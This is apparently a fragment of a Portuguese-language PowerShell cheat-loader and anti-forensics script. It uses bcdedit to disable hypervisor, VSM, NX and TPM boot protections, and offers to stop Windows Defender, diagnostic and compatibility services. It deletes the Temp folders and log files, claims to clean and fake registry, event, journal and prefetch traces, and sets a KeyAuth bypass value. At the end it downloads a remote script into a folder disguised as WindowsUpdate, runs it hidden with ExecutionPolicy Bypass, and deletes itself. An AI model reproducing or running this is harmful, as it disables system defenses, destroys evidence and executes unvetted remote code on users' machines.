    "/set hypervisorlaunchtype off",
    "/set avoidlowmemory 0x8000000",
    "/set nolowmem yes",
    "/set vsmlaunchtype off",
    "/set vm no",
    "/set allowedinmemorysettings 0x0",
    "/set isolatedcontext no",
    "/set nx optout",
    "/set bootmenupolicy standard",
    "/set tpmbootentropy ForceDisable",
    "/set quietboot yes",
    "/set linearADDress57 OptOut",
    "/set increaseuserva 268435328",
    "/set firstmegabytepolicy UseAll",
    "/set configaccesspolicy Default",
    "/set msi Default",
    "/set usephysicaldestination no",
    "/set usefirmwarepcisettings no"
)
foreach ($cmd in $bcdCmds) {
    Invoke-Expression "bcdedit.exe $cmd"
}

$cdpService = Get-Service | Where-Object { $_.Name -like "CDPUserSvc_*" }
$servicesToCheck = @("WinDefend", "dps", "diagtrack", "pcasvc") + $cdpService.Name
Write-Host "`n[+] - Status atual dos serviços:" -ForegroundColor White
foreach ($svcName in $servicesToCheck) {
    try {
        $svc = Get-Service -Name $svcName -ErrorAction Stop
        $status = switch ($svc.Status) {
            'Running' { "- Rodando" }
            'Stopped' { "- Parado" }
            default   { $svc.Status }
        }
        $color = if ($svc.Status -eq 'Running') { 'Red' } else { 'Green' }
        Write-Host "$svcName = $status" -ForegroundColor $color
    } catch {
        Write-Host "[!] - $svcName Não encontrado" -ForegroundColor Red
    }
}

$input = Read-Host "`nDigite S para parar, R para reativar, ou N para sair"
switch ($input.ToUpper()) {
    'S' {
        Write-Host "`n[+] - Parando serviços rodando..." -ForegroundColor Green
        foreach ($svcName in $servicesToCheck) {
            try {
                $svc = Get-Service -Name $svcName -ErrorAction Stop
                if ($svc.Status -eq 'Running') {
                    sc.exe stop $svcName | Out-Null
                    Write-Host "$svcName parado." -ForegroundColor red
                }
            } catch { }
        }
    }
    'R' {
        Write-Host "`n[+] - Reativando serviços parados..." -ForegroundColor Green
        foreach ($svcName in $servicesToCheck) {
            try {
                $svc = Get-Service -Name $svcName -ErrorAction Stop
                if ($svc.Status -eq 'Stopped') {
                    sc.exe start $svcName | Out-Null
                    Write-Host "$svcName iniciado." -ForegroundColor Green
                }
            } catch { }
        }
    }
    'N' {
        Write-Host "`n[!] - Operação cancelada pelo usuário." -ForegroundColor Red
    }
    Default {
        Write-Host "`n[!] - Opção inválida." -ForegroundColor Red
    }
}

$tempPath = $env:TEMP
$winTemp = "C:\Windows\Temp"
Remove-Item -Path $tempPath -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
takeown.exe /f "$tempPath" /r /d y
takeown.exe /f "$winTemp" /r /d y
Remove-Item -Path $winTemp -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $winTemp -Force | Out-Null
Get-ChildItem -Path . -Recurse -Include *.log | Remove-Item -Force -ErrorAction SilentlyContinue
Stop-Process -Name explorer -Force
Start-Process explorer.exe

#Opção Desativar Loader
$authRegPath = "HKCU:\Software\KeyAuth"
if (Test-Path $authRegPath) {
    Set-ItemProperty -Path $authRegPath -Name "AuthBypass" -Value 0 -Force
} else {
}
# Final completion message
Clear-Host
Write-Host "`n==================================" -ForegroundColor White
Write-Host "`Limpeza de Registro Ok!" -ForegroundColor Green
Write-Host "`Limpeza de Eventos Ok!" -ForegroundColor Green
Write-Host "`Limpeza de Journal Ok!" -ForegroundColor Green
Write-Host "`Fake de Registro Ok!" -ForegroundColor Green
Write-Host "`Fake de Event Ok!" -ForegroundColor Green
Write-Host "`Fake de Log | Prefetch | Temp Ok!" -ForegroundColor Green
Write-Host "`Fake Execuçao de Programas Ok!" -ForegroundColor Green
Write-Host "`n==================================" -ForegroundColor White
Write-Host "`Finalizado com sucesso!" -ForegroundColor White
Write-Host "`n==================================" -ForegroundColor White

# Versão melhorada do script de download e execução
Clear-Host
$ErrorActionPreference = 'Stop'
$destDir = "C:\Windows\Temp\WindowsUpdate"
$scriptName = "WUHelper_$(Get-Date -Format 'yyyyMMdd_HHmmss').ps1" 
$scriptPath = Join-Path -Path $destDir -ChildPath $scriptName
$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"
$logFile = Join-Path -Path $destDir -ChildPath "Downloader_$(Get-Date -Format 'yyyyMMdd').log"
function Write-Log {
    param (
        [string]$message,
        [string]$type = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$type] $message"
    try {
        Add-Content -Path $logFile -Value $logEntry -ErrorAction SilentlyContinue
    } catch {
        Write-Host "[!] - Falha ao escrever no log: $_"
    }
}

try {
    if (-not (Test-Path $destDir)) {
        New-Item -Path $destDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        Write-Log "Diretório criado: $destDir"
    }
    Write-Log "[+] - Iniciando download do script de $downloadUrl"
    $progressPreference = 'silentlyContinue'  # Oculta a barra de progresso
    Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath -ErrorAction Stop
    $progressPreference = 'Continue'
    
    if (Test-Path $scriptPath) {
        Write-Log "[+] - Script baixado com sucesso para $scriptPath"
        if ((Get-Item $scriptPath).Length -eq 0) {
            throw "Arquivo baixado está vazio"
        }

        Write-Log "[+] - Iniciando execução do script"
        $process = Start-Process powershell.exe -ArgumentList @(
            "-NoLogo",
            "-ExecutionPolicy Bypass",
            "-NoProfile",
            "-File `"$scriptPath`""
        ) -PassThru -WindowStyle Hidden

        $selfPath = $MyInvocation.MyCommand.Definition
        if (-not [string]::IsNullOrEmpty($selfPath) -and (Test-Path $selfPath)) {
            Write-Log "[+] - Agendando auto-exclusão deste script"
            Start-Process powershell.exe -ArgumentList @(
                "-NoLogo",
                "-NoProfile",
                "-Command",
                "Start-Sleep -Seconds 5;",
                "try { Remove-Item -Path '$selfPath' -Force -ErrorAction Stop }",
                "catch { Write-Output 'Falha na auto-exclusão: $_' | Out-File '$logFile' -Append }"
            ) -WindowStyle Hidden
        }
        
        Write-Log "[+] - Operação concluída com sucesso"
        exit 0
    } else {
        throw "[!] - Falha ao baixar o script - arquivo não encontrado após download"
    }
}
catch {
    $errorMsg = "ERRO: $($_.Exception.Message)"
    Write-Host $errorMsg -ForegroundColor Red
    Write-Log $errorMsg -type "ERROR"
    exit 1
}
Pause-Script
